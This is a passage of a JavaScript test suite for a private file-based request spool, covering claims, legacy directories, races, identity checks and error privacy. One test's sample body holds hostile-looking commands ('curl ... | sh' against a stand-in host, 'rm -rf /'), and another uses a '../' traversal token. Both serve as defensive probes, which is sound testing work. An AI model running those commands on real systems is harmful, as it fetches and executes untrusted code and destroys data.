    assert.deepEqual(result, { outcome: "none", request: "legacy body" });
    assert.deepEqual(await entryNames(legacy), [], "legacy public entry consumed");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "stable spool untouched");

    // A legacy directory that does not exist is simply "no legacy entries".
    const absent = path.join(root, "absent-legacy");
    await writePublic(directory, TOKEN, "stable body");
    await consumeRequest({
      directory,
      legacyDirectory: absent,
      token: TOKEN,
      route: async () => ({ outcome: "none" }),
    });
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

test("a token present in both stable and legacy directories is ambiguity", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const legacy = await freshLegacy(root);
    await writePublic(directory, TOKEN, "stable body");
    await writePublic(legacy, TOKEN, "legacy body");

    await assert.rejects(
      consumeRequest({ directory, legacyDirectory: legacy, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-AMBIGUOUS"),
    );
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), "stable body");
    assert.equal(await readFile(publicPathOf(legacy, TOKEN), "utf8"), "legacy body");

    // A claim in one location and a public entry in the other is ambiguous too.
    await rm(publicPathOf(directory, TOKEN));
    const claim = await writeClaim(legacy, TOKEN, "legacy claim body");
    await assert.rejects(
      consumeRequest({ directory, legacyDirectory: legacy, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-AMBIGUOUS"),
    );
    assert.equal(await readFile(path.join(legacy, claim), "utf8"), "legacy claim body");
  });
});

test("legacy directories need owner privacy but no marker, and fail closed when mode is wrong", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const legacy = await freshLegacy(root);
    await writePublic(legacy, TOKEN, "legacy body");
    assert.deepEqual(await inspectRequestEntry(legacy, TOKEN, { legacy: true }), {
      status: "public",
      public: true,
      claims: 0,
    });
    if (posix) {
      await chmod(legacy, 0o755);
      await assert.rejects(
        consumeRequest({ directory, legacyDirectory: legacy, token: TOKEN, route: async () => ({}) }),
        rejectsWith("REQUEST-SPOOL-MODE"),
      );
      assert.equal(await readFile(publicPathOf(legacy, TOKEN), "utf8"), "legacy body");
      await chmod(legacy, REQUEST_SPOOL_MODE);
    }
    await consumeRequest({ directory, legacyDirectory: legacy, token: TOKEN, route: async () => ({}) });
    assert.deepEqual(await entryNames(legacy), []);
  });
});

test("presence inspection reports public and claim states for preflight", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    assert.deepEqual(await inspectRequestEntry(directory, TOKEN), {
      status: "absent",
      public: false,
      claims: 0,
    });
    await writePublic(directory, TOKEN, "body");
    assert.deepEqual(await inspectRequestEntry(directory, TOKEN), {
      status: "public",
      public: true,
      claims: 0,
    });
    const claim = await writeClaim(directory, TOKEN, "body");
    assert.deepEqual(await inspectRequestEntry(directory, TOKEN), {
      status: "public-and-claim",
      public: true,
      claims: 1,
    });
    await rm(publicPathOf(directory, TOKEN));
    assert.deepEqual(await inspectRequestEntry(directory, TOKEN), {
      status: "claim",
      public: false,
      claims: 1,
    });
    await writeClaim(directory, TOKEN, "body");
    assert.deepEqual(await inspectRequestEntry(directory, TOKEN), {
      status: "multiple-claims",
      public: false,
      claims: 2,
    });
    const text = leakText(await inspectRequestEntry(directory, TOKEN));
    assert.ok(!text.includes(TOKEN), "inspection never echoes the token");
    assert.ok(!text.includes(root), "inspection never echoes the path");
    assert.ok(!text.includes(claim), "inspection never echoes a claim name");
    await assert.rejects(inspectRequestEntry(directory, "nope"), rejectsWith("REQUEST-TOKEN-INVALID"));
  });
});

// ---------------------------------------------------------------------------
// Failures after the claim, and the resume that follows each one
// ---------------------------------------------------------------------------

test("a route callback failure preserves the claim and a retry resumes the same claim", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "route fails here";
    await writePublic(directory, TOKEN, body);

    await assert.rejects(
      consumeRequest({
        directory,
        token: TOKEN,
        route: async (request) => {
          throw new Error(`callback exploded with ${request}`);
        },
      }),
      (error) => {
        assertFixedError(error, "REQUEST-ROUTE-FAILED");
        assert.ok(!leakText(error).includes(body), "callback error text never surfaces");
        return true;
      },
    );
    const [firstClaim] = await claimsOf(directory, TOKEN);
    assert.equal(await readFile(path.join(directory, firstClaim), "utf8"), body, "claim preserved byte for byte");

    const result = await consumeRequest({
      directory,
      token: TOKEN,
      route: async (request) => ({ outcome: "none", request }),
    });
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "no claim remains after the successful retry");
    assert.deepEqual(result, { outcome: "none", request: body });
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

test("a failure between the rename and the read leaves exactly one resumable claim", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "interrupted after claim";
    await writePublic(directory, TOKEN, body);

    // Crash-style interruption: the directory sync after the rename fails, so
    // the claim exists but the consumer never read, routed, or removed it.
    await assert.rejects(
      withInternals(
        { syncDirectory: async () => { throw fsError("EIO"); } },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-SPOOL-SYNC-FAILED"),
    );
    const [claim] = await claimsOf(directory, TOKEN);
    assert.ok(claim, "the claim survives the interrupted consumption");
    assert.equal(await readFile(path.join(directory, claim), "utf8"), body);
    await assert.rejects(lstat(publicPathOf(directory, TOKEN)), { code: "ENOENT" }, "the public path is empty after the claim");

    const seen = [];
    await consumeRequest({ directory, token: TOKEN, route: async (request) => { seen.push(request); return {}; } });
    assert.deepEqual(seen, [body], "the retry resumed the exact claim");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

test("chmod, rename, read, and unlink failures each preserve the request and use fixed errors", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "failure matrix body";
    await writePublic(directory, TOKEN, body);
    await assert.rejects(
      withInternals({ handleChmod: async () => { throw fsError("EPERM"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CLAIM-MODE"),
    );
    const [afterChmod] = await claimsOf(directory, TOKEN);
    assert.equal(await readFile(path.join(directory, afterChmod), "utf8"), body, "claim preserved after chmod failure");
    await rm(path.join(directory, afterChmod));

    // The chmod failure renamed the public entry away, so re-publish it for the
    // rename-failure probe.
    await writePublic(directory, TOKEN, body);
    await assert.rejects(
      withInternals({ rename: async () => { throw fsError("EIO"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CLAIM-RENAME"),
    );
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "no claim after a failed rename");
    assert.equal(await readFile(publicPathOf(directory, TOKEN), "utf8"), body, "public bytes preserved");

    await assert.rejects(
      withInternals({ handleRead: async () => { throw fsError("EIO"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-READ-FAILED"),
    );
    const [afterRead] = await claimsOf(directory, TOKEN);
    assert.equal(await readFile(path.join(directory, afterRead), "utf8"), body, "claim preserved after read failure");
    await rm(path.join(directory, afterRead));

    await writePublic(directory, TOKEN, body);
    await assert.rejects(
      withInternals({ unlink: async () => { throw fsError("EPERM"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CLAIM-REMOVE"),
    );
    const [afterUnlink] = await claimsOf(directory, TOKEN);
    assert.equal(
      await readFile(path.join(directory, afterUnlink), "utf8"),
      body,
      "claim preserved after unlink failure",
    );

    // Every one of those failures is resumable.
    const seen = [];
    await consumeRequest({ directory, token: TOKEN, route: async (request) => { seen.push(request); return {}; } });
    assert.deepEqual(seen, [body]);
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

test("an fsync failure after the unlink is the documented at-most-once boundary", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "at most once body");

    const realSync = requestSpoolInternals.syncDirectory;
    let syncs = 0;
    await assert.rejects(
      withInternals(
        {
          syncDirectory: async (target) => {
            syncs += 1;
            if (syncs > 1) throw fsError("EIO");
            return realSync(target);
          },
        },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({ outcome: "none" }) }),
      ),
      rejectsWith("REQUEST-SPOOL-SYNC-FAILED"),
    );
    assert.equal(syncs, 2, "the claim sync succeeded, the post-unlink sync failed");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "the request was consumed exactly once");
    await assert.rejects(
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      rejectsWith("REQUEST-ABSENT"),
      "a retry reports absence; the request is not redelivered",
    );
  });
});

// ---------------------------------------------------------------------------
// Concurrent consumers, surviving replacements, identity drift
// ---------------------------------------------------------------------------

test("concurrent consumers of one public token produce at most one success", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "only one of us wins";
    await writePublic(directory, TOKEN, body);

    const seen = [];
    const route = async (request) => {
      seen.push(request);
      return { outcome: "none" };
    };
    const results = await Promise.allSettled([
      consumeRequest({ directory, token: TOKEN, route }),
      consumeRequest({ directory, token: TOKEN, route }),
    ]);
    const fulfilled = results.filter((result) => result.status === "fulfilled");
    const rejected = results.filter((result) => result.status === "rejected");
    assert.equal(fulfilled.length, 1, "exactly one consumer succeeded");
    assert.equal(rejected.length, 1);
    assert.ok(isRequestSpoolError(rejected[0].reason));
    assert.match(rejected[0].reason.code, /^REQUEST-/);
    assert.deepEqual(seen, [body], "the request was routed exactly once");
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
  });
});

test("concurrent consumers of one claim produce at most one success", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = "claim race body";
    await writeClaim(directory, TOKEN, body);

    const route = async (request) => ({ outcome: "none", request });
    const results = await Promise.allSettled([
      consumeRequest({ directory, token: TOKEN, route }),
      consumeRequest({ directory, token: TOKEN, route }),
    ]);
    const fulfilled = results.filter((result) => result.status === "fulfilled");
    assert.equal(fulfilled.length, 1, "exactly one consumer succeeded");
    assert.deepEqual(fulfilled[0].value, { outcome: "none", request: body });
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME], "the claim was removed exactly once");
  });
});

test("a replacement written at the public path after the claim survives consumption", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "first submission");
    const replacementBody = "second submission while the first is routed";

    const result = await consumeRequest({
      directory,
      token: TOKEN,
      route: async (request) => {
        assert.equal(request, "first submission");
        await writePublic(directory, TOKEN, replacementBody);
        return { outcome: "none" };
      },
    });
    assert.deepEqual(result, { outcome: "none" });
    assert.equal(
      await readFile(publicPathOf(directory, TOKEN), "utf8"),
      replacementBody,
      "the replacement at the public path is never removed",
    );
    assert.deepEqual(await claimsOf(directory, TOKEN), [], "the routed claim is gone");
  });
});

test("an identity swap at the claim path is refused and the replacement survives", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "original bytes");

    await assert.rejects(
      withInternals(
        {
          afterRead: async () => {
            const [claim] = await claimsOf(directory, TOKEN);
            await rm(path.join(directory, claim));
            await writeFile(path.join(directory, claim), "swapped bytes", { mode: 0o600 });
          },
        },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CHANGED"),
    );
    const [claim] = await claimsOf(directory, TOKEN);
    assert.equal(await readFile(path.join(directory, claim), "utf8"), "swapped bytes", "replacement preserved");
    await assert.rejects(lstat(publicPathOf(directory, TOKEN)), { code: "ENOENT" }, "nothing was restored to the public path");
  });
});

test("growth and truncation between the read and the re-fstat are refused", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "g".repeat(5000));
    await assert.rejects(
      withInternals(
        {
          afterRead: async () => {
            const [claim] = await claimsOf(directory, TOKEN);
            await appendFile(path.join(directory, claim), "g".repeat(64));
          },
        },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CHANGED"),
    );
    let [claim] = await claimsOf(directory, TOKEN);
    assert.equal((await stat(path.join(directory, claim))).size, 5064, "grown claim preserved");
    await rm(path.join(directory, claim));

    await writePublic(directory, TOKEN, "t".repeat(5000));
    await assert.rejects(
      withInternals(
        {
          afterRead: async () => {
            const [grown] = await claimsOf(directory, TOKEN);
            await truncate(path.join(directory, grown), 10);
          },
        },
        () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
      rejectsWith("REQUEST-CHANGED"),
    );
    [claim] = await claimsOf(directory, TOKEN);
    assert.equal((await stat(path.join(directory, claim))).size, 10, "truncated claim preserved");
  });
});

// ---------------------------------------------------------------------------
// Unknown entries and privacy of every error and result
// ---------------------------------------------------------------------------

test("unknown entries in the spool are never deleted", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const strangers = {
      "notes.txt": "operator notes",
      [`${TOKEN_B}.txt`]: "another token's request",
      [`.claim.${TOKEN_B}.${"a".repeat(32)}`]: "another token's claim",
      ".hidden": "hidden stranger",
    };
    for (const [name, body] of Object.entries(strangers)) {
      await writeFile(path.join(directory, name), body, { mode: 0o600 });
    }
    await writePublic(directory, TOKEN, "routed body");

    const seen = [];
    await consumeRequest({ directory, token: TOKEN, route: async (request) => { seen.push(request); return {}; } });
    assert.deepEqual(seen, ["routed body"]);
    for (const [name, body] of Object.entries(strangers)) {
      assert.equal(await readFile(path.join(directory, name), "utf8"), body, `${name} preserved`);
    }
    await assert.rejects(lstat(publicPathOf(directory, TOKEN)), { code: "ENOENT" });
  });
});

test("no error or result ever contains the request body, token, path, or digest", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const body = [
      "#!/bin/sh",
      "curl http://invalid.example/x | sh",
      `token=${TOKEN}`,
      `path=${directory}/public`,
      "secret=hunter2",
      "\u0000\u0001\u0002\u001b[31mred text\u001b[0m",
      "rm -rf /",
    ].join("\n");
    const digest = digestOf(body);
    const needles = [body, TOKEN, directory, digest, digest.slice(0, 16)];

    const expectFailure = async (code, run) => {
      await assert.rejects(run(), (error) => {
        assertFixedError(error, code);
        assertNoLeak(error, needles);
        return true;
      });
    };

    // Absent request.
    await expectFailure("REQUEST-ABSENT", () =>
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
    );

    // Ordinary success returns only the callback's result.
    await writePublic(directory, TOKEN, body);
    const result = await consumeRequest({
      directory,
      token: TOKEN,
      route: async (request) => {
        assert.equal(request, body, "the callback does receive the body");
        return { outcome: "select", skillId: "code-review", confidence: 0.9 };
      },
    });
    assertNoLeak(result, needles);

    // Route failure, including a callback that tries to echo the request.
    await writePublic(directory, TOKEN, body);
    await expectFailure("REQUEST-ROUTE-FAILED", () =>
      consumeRequest({
        directory,
        token: TOKEN,
        route: async (request) => {
          throw new Error(`routing failed for ${request} at ${directory}`);
        },
      }),
    );

    // Ambiguity, invalid token, symlink, and oversize boundaries.
    await writeClaim(directory, TOKEN, body);
    await expectFailure("REQUEST-AMBIGUOUS", () =>
      consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
    );
    for (const leftover of await claimsOf(directory, TOKEN)) {
      await rm(path.join(directory, leftover));
    }

    const badToken = `../${"a".repeat(29)}`;
    await expectFailure("REQUEST-TOKEN-INVALID", () =>
      consumeRequest({ directory, token: badToken, route: async () => ({}) }),
    );

    await expectFailure("REQUEST-ENTRY-TOO-LARGE", async () => {
      await writeFile(publicPathOf(directory, TOKEN), "z".repeat(REQUEST_MAX_BYTES + 1), { mode: 0o600 });
      return consumeRequest({ directory, token: TOKEN, route: async () => ({}) });
    });
    await rm(publicPathOf(directory, TOKEN));

    if (posix) {
      const target = path.join(root, "symlink-target");
      await writeFile(target, body, { mode: 0o600 });
      await symlink(target, publicPathOf(directory, TOKEN));
      await expectFailure("REQUEST-ENTRY-TYPE", () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      );
      await rm(publicPathOf(directory, TOKEN));
      assert.equal(await readFile(target, "utf8"), body, "the symlink target survived untouched");
    }

    // The failure matrix inside one request lifecycle also stays silent.
    await writePublic(directory, TOKEN, body);
    await expectFailure("REQUEST-CLAIM-MODE", () =>
      withInternals({ handleChmod: async () => { throw fsError("EPERM"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
    );
    await expectFailure("REQUEST-READ-FAILED", () =>
      withInternals({ handleRead: async () => { throw fsError("EIO"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
    );
    await expectFailure("REQUEST-ROUTE-FAILED", () =>
      consumeRequest({
        directory,
        token: TOKEN,
        route: async (request) => {
          throw new Error(request);
        },
      }),
    );
    await expectFailure("REQUEST-CLAIM-REMOVE", () =>
      withInternals({ unlink: async () => { throw fsError("EPERM"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
    );
    // Every pre-commit failure above preserved the request under some claim
    // name; prove the bytes survived before the final at-most-once probe.
    const [surviving] = await claimsOf(directory, TOKEN);
    assert.equal(await readFile(path.join(directory, surviving), "utf8"), body, "the request survived every failure");
    await expectFailure("REQUEST-SPOOL-SYNC-FAILED", () =>
      withInternals({ syncDirectory: async () => { throw fsError("EIO"); } }, () =>
        consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
      ),
    );

    // Setup/inspect/assert helpers stay silent too.
    await assert.rejects(setupRequestSpool(path.join(directory, "nested", "deeper")), (error) => {
      assertFixedError(error, "REQUEST-SPOOL-CREATE");
      assertNoLeak(error, needles);
      return true;
    });
    assertNoLeak(await inspectRequestSpool(directory), needles);
    assertNoLeak(await inspectRequestEntry(directory, TOKEN), needles);
    await writeClaim(directory, TOKEN_B, "pending stranger");
    await assert.rejects(removeRequestSpoolIfEmpty(directory), (error) => {
      assertFixedError(error, "REQUEST-SPOOL-NOT-EMPTY");
      assertNoLeak(error, needles);
      return true;
    });
  });
});

test("the request-spool error set stays small, fixed, and free of request material", async () => {
  const codes = new Set();
  const messages = new Set();
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    const legacy = await freshLegacy(root);
    await writePublic(directory, TOKEN, "material");
    await writePublic(legacy, TOKEN, "material");
    await writeClaim(legacy, TOKEN_B, "legacy claim");
    const probes = [
      () => consumeRequest({ directory, legacyDirectory: legacy, token: TOKEN, route: async () => ({}) }),
      () => consumeRequest({ directory, token: "bad", route: async () => ({}) }),
      () => consumeRequest({ directory, token: TOKEN_B, route: async () => ({}) }),
      () => consumeRequest({ directory, token: TOKEN, route: "nope" }),
      () => setupRequestSpool(path.join(root, "nope", "deeper")),
      () => assertRequestSpoolEmpty(directory),
      () => removeRequestSpoolIfEmpty(directory),
      () => inspectRequestEntry(directory, TOKEN),
    ];
    for (const probe of probes) {
      try {
        await probe();
      } catch (error) {
        assert.ok(isRequestSpoolError(error));
        codes.add(error.code);
        messages.add(error.message);
        assert.ok(!/\/|\\/.test(error.message), "no path separators in fixed messages");
        assert.ok(!/[0-9a-f]{16}/.test(error.message), "no digest-like hex in fixed messages");
      }
    }
  });
  assert.ok(codes.size >= 5, `distinct boundaries report distinct codes, saw ${[...codes].join(", ")}`);
  assert.equal(codes.size, messages.size, "each code has one fixed message");
});

// ---------------------------------------------------------------------------
// Phase 7 integration primitives: parent creation, legacy inspection, refusal
// ---------------------------------------------------------------------------

test("setup creates missing parents safely and never chmods an existing one", async () => {
  await withTemp(async (root) => {
    // A deep global-style path whose parents do not exist yet.
    const directory = path.join(root, "home", ".local", "share", "skill-router-requests");
    const result = await setupRequestSpool(directory, { createParents: true });
    assert.equal(result.created, true);
    assert.deepEqual(await entryNames(directory), [REQUEST_MARKER_NAME]);
    if (posix) {
      assert.equal((await stat(directory)).mode & 0o777, REQUEST_SPOOL_MODE, "the spool itself is exactly 0700");
      assert.equal((await stat(path.dirname(directory))).mode & 0o777, REQUEST_SPOOL_MODE);
      assert.equal((await stat(path.dirname(path.dirname(directory)))).mode & 0o777, REQUEST_SPOOL_MODE);
    }

    // An existing parent keeps its mode; only the spool is (re)normalized.
    if (posix) {
      const share = path.dirname(directory);
      await chmod(share, 0o755);
      await setupRequestSpool(directory, { createParents: true });
      assert.equal((await stat(share)).mode & 0o777, 0o755, "an existing parent is never chmodded");
      assert.equal((await stat(directory)).mode & 0o777, REQUEST_SPOOL_MODE);
    }
  });
});

test("setup refuses to traverse a non-directory parent", async () => {
  await withTemp(async (root) => {
    const file = path.join(root, "blocking-file");
    await writeFile(file, "not a directory");
    await assert.rejects(
      setupRequestSpool(path.join(file, "nested", "spool"), { createParents: true }),
      rejectsWith("REQUEST-SPOOL-CREATE"),
    );
    assert.equal(await readFile(file, "utf8"), "not a directory", "the blocking file is untouched");
  });
});

test("legacy request directory inspection classifies without revealing anything", async () => {
  await withTemp(async (root) => {
    const absent = path.join(root, "no-legacy");
    assert.deepEqual(await inspectLegacyRequestDirectory(absent), { status: "absent", entries: 0 });

    const directory = path.join(root, "legacy");
    await mkdir(directory);
    if (posix) await chmod(directory, 0o700);
    assert.deepEqual(await inspectLegacyRequestDirectory(directory), { status: "empty", entries: 0 });

    const secretBody = "legacy request body with a sentinel";
    const token = "0123456789abcdef0123456789abcdef";
    await writeFile(path.join(directory, `${token}.txt`), secretBody, { mode: 0o600 });
    const present = await inspectLegacyRequestDirectory(directory);
    assert.equal(present.status, "present");
    assert.equal(present.entries, 1, "only a count is reported, never a name");
    const text = leakText(present);
    assert.ok(!text.includes(token), "inspection never echoes a token or name");
    assert.ok(!text.includes(secretBody), "inspection never echoes a body");
    assert.ok(!text.includes(root), "inspection never echoes a path");

    await assertLegacyRequestDirectoryEmpty(directory).then(
      () => assert.fail("a pending legacy request must refuse"),
      (error) => {
        assertFixedError(error, "REQUEST-LEGACY-PENDING");
        assertNoLeak(error, [secretBody, token, root, directory]);
      },
    );
    assert.equal(await readFile(path.join(directory, `${token}.txt`), "utf8"), secretBody, "the entry is preserved");

    await rm(path.join(directory, `${token}.txt`));
    await assertLegacyRequestDirectoryEmpty(directory);
  });
});

test("legacy request directory refuses unsafe shapes without touching them", async () => {
  await withTemp(async (root) => {
    if (posix) {
      // A symlinked legacy directory is never followed.
      const target = path.join(root, "real");
      await mkdir(target);
      await chmod(target, 0o700);
      await writeFile(path.join(target, "keep.txt"), "keep", { mode: 0o600 });
      const link = path.join(root, "legacy-link");
      await symlink(target, link);
      assert.deepEqual(await inspectLegacyRequestDirectory(link), { status: "unsafe", entries: null });
      await assertLegacyRequestDirectoryEmpty(link).then(
        () => assert.fail("a symlinked legacy directory must refuse"),
        (error) => assertFixedError(error, "REQUEST-LEGACY-UNSAFE"),
      );
      assert.equal(await readFile(path.join(target, "keep.txt"), "utf8"), "keep", "the target is untouched");

      // A group-readable legacy directory is not confidential.
      const loose = path.join(root, "legacy-loose");
      await mkdir(loose);
      await chmod(loose, 0o755);
      assert.deepEqual(await inspectLegacyRequestDirectory(loose), { status: "unsafe", entries: null });
      await assertLegacyRequestDirectoryEmpty(loose).then(
        () => assert.fail("a non-private legacy directory must refuse"),
        (error) => assertFixedError(error, "REQUEST-LEGACY-UNSAFE"),
      );
    }

    // A file where a directory belongs is unsafe, not a crash.
    const file = path.join(root, "legacy-file");
    await writeFile(file, "x");
    assert.deepEqual(await inspectLegacyRequestDirectory(file), { status: "unsafe", entries: null });

    // A foreign-owned legacy directory is unsafe.
    if (posix) {
      const owned = path.join(root, "legacy-owned");
      await mkdir(owned);
      await chmod(owned, 0o700);
      const realLstat = requestSpoolInternals.lstat;
      await withInternals(
        { lstat: async (target) => (String(target) === owned ? { ...(await realLstat(target)), uid: realUid + 1, isFile: () => false, isDirectory: () => true, isSymbolicLink: () => false } : realLstat(target)) },
        async () => {
          assert.deepEqual(await inspectLegacyRequestDirectory(owned), { status: "unsafe", entries: null });
        },
      );
    }
  });
});

test("a legacy directory that overflows the bound reports present, not a name list", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "legacy");
    await mkdir(directory);
    if (posix) await chmod(directory, 0o700);
    await withInternals(
      { readdirNames: async () => ({ names: [], overflow: true }) },
      async () => {
        assert.deepEqual(await inspectLegacyRequestDirectory(directory), { status: "present", entries: null });
        await assertLegacyRequestDirectoryEmpty(directory).then(
          () => assert.fail("an overflowing legacy directory must refuse"),
          (error) => assertFixedError(error, "REQUEST-LEGACY-PENDING"),
        );
      },
    );
  });
});

test("requestSpoolRefusal accepts only states setup can repair and fixes every other one", async () => {
  for (const status of ["absent", "adoptable", "ready", "not-private"]) {
    assert.equal(requestSpoolRefusal({ status }), null, `${status} is an acceptable planned state`);
  }
  const expected = {
    "not-a-directory": "REQUEST-SPOOL-TYPE",
    "not-owned": "REQUEST-SPOOL-OWNER",
    unmarked: "REQUEST-SPOOL-UNMARKED",
    "marker-invalid": "REQUEST-SPOOL-MARKER",
    excessive: "REQUEST-SPOOL-ENTRIES",
  };
  for (const [status, code] of Object.entries(expected)) {
    const refusal = requestSpoolRefusal({ status });
    assert.ok(isRequestSpoolError(refusal), `${status} refuses`);
    assert.equal(refusal.code, code);
    assert.ok(!refusal.message.includes("/"), "no path in the refusal");
  }
  // An unknown future status refuses closed rather than being accepted.
  assert.equal(requestSpoolRefusal({ status: "future-state" }).code, "REQUEST-IO-FAILED");
  assert.equal(requestSpoolRefusal(undefined).code, "REQUEST-IO-FAILED");
});

/* ================================================================== *
 * Phase 14 - runtime platform refusal and strong file identity
 * ================================================================== */

async function caught(run) {
  try {
    await run();
    return null;
  } catch (error) {
    return error;
  }
}

/** A real stat whose inode is replaced by 0, so identity is unavailable. */
async function weakIdentityStat(stat) {
  return Object.assign(Object.create(Object.getPrototypeOf(stat)), stat, { ino: 0 });
}

test("the spool API refuses an unsupported runtime platform before any filesystem call", async () => {
  await withTemp(async (root) => {
    const directory = path.join(root, "spool");
    const legacy = path.join(root, "legacy-requests");
    const calls = [];
    const overrides = {};
    for (const key of Object.keys(requestSpoolInternals)) {
      const original = requestSpoolInternals[key];
      overrides[key] = (...args) => {
        calls.push(key);
        return original.apply(requestSpoolInternals, args);
      };
    }

    const originalPlatform = platformInternals.platform;
    platformInternals.platform = () => "win32";
    try {
      await withInternals(overrides, async () => {
        const probes = [
          () => setupRequestSpool(directory, { createParents: true }),
          () => inspectRequestSpool(directory),
          () => assertRequestSpoolEmpty(directory),
          () => removeRequestSpoolIfEmpty(directory),
          () => inspectRequestEntry(directory, TOKEN),
          () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
          () => inspectLegacyRequestDirectory(legacy),
          () => assertLegacyRequestDirectoryEmpty(legacy),
        ];
        for (const probe of probes) {
          const error = await caught(probe);
          assert.ok(error, "the probe refused");
          assert.equal(error.code, PLATFORM_ERROR_CODE, "the stable platform refusal");
          assert.equal(error.name, "PlatformUnsupportedError");
        }
      });
    } finally {
      platformInternals.platform = originalPlatform;
    }

    assert.deepEqual(calls, [], "zero spool filesystem calls happened");
    assert.deepEqual(await readdir(root), [], "nothing was created on disk");
  });
});

test("consumption refuses an entry whose identity cannot be proven before any rename or unlink", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "material");
    const publicPath = publicPathOf(directory, TOKEN);
    const realLstat = requestSpoolInternals.lstat;
    const realRename = requestSpoolInternals.rename;
    const realUnlink = requestSpoolInternals.unlink;
    const realOpenRead = requestSpoolInternals.openRead;
    let renames = 0;
    let unlinks = 0;
    let opens = 0;
    const error = await withInternals(
      {
        lstat: async (target) => {
          const stat = await realLstat(target);
          if (path.resolve(target) !== path.resolve(publicPath)) return stat;
          return weakIdentityStat(stat);
        },
        rename: async (from, to) => {
          renames += 1;
          return realRename(from, to);
        },
        unlink: async (target) => {
          unlinks += 1;
          return realUnlink(target);
        },
        openRead: async (target) => {
          opens += 1;
          return realOpenRead(target);
        },
      },
      async () =>
        caught(() =>
          consumeRequest({
            directory,
            token: TOKEN,
            route: async () => {
              throw new Error("the route callback must never run");
            },
          }),
        ),
    );
    assert.ok(isRequestSpoolError(error));
    assert.equal(error.code, "REQUEST-IDENTITY-UNAVAILABLE");
    assert.equal(renames, 0, "no rename ran");
    assert.equal(unlinks, 0, "no unlink ran");
    assert.equal(opens, 0, "the unprovable entry was never even opened");
    assert.equal(await readFile(publicPath, "utf8"), "material", "the request is untouched");
  });
});

test("an unprovable spool identity refuses setup, consumption, and removal without any mutation", async () => {
  await withTemp(async (root) => {
    const directory = await freshSpool(root);
    await writePublic(directory, TOKEN, "material");
    const spoolBefore = await entryNames(directory);
    const realLstat = requestSpoolInternals.lstat;
    const realChmod = requestSpoolInternals.chmod;
    const realMkdir = requestSpoolInternals.mkdir;
    const realUnlink = requestSpoolInternals.unlink;
    const realRmdir = requestSpoolInternals.rmdir;
    const realOpenCreateExclusive = requestSpoolInternals.openCreateExclusive;
    let chmods = 0;
    let mkdirs = 0;
    let unlinks = 0;
    let rmdirs = 0;
    let creates = 0;
    await withInternals(
      {
        lstat: async (target) => {
          const stat = await realLstat(target);
          if (path.resolve(target) !== path.resolve(directory)) return stat;
          return weakIdentityStat(stat);
        },
        chmod: async (target, mode) => {
          chmods += 1;
          return realChmod(target, mode);
        },
        mkdir: async (target, mode) => {
          mkdirs += 1;
          return realMkdir(target, mode);
        },
        unlink: async (target) => {
          unlinks += 1;
          return realUnlink(target);
        },
        rmdir: async (target) => {
          rmdirs += 1;
          return realRmdir(target);
        },
        openCreateExclusive: async (target, mode) => {
          creates += 1;
          return realOpenCreateExclusive(target, mode);
        },
      },
      async () => {
        for (const probe of [
          () => setupRequestSpool(directory),
          () => consumeRequest({ directory, token: TOKEN, route: async () => ({}) }),
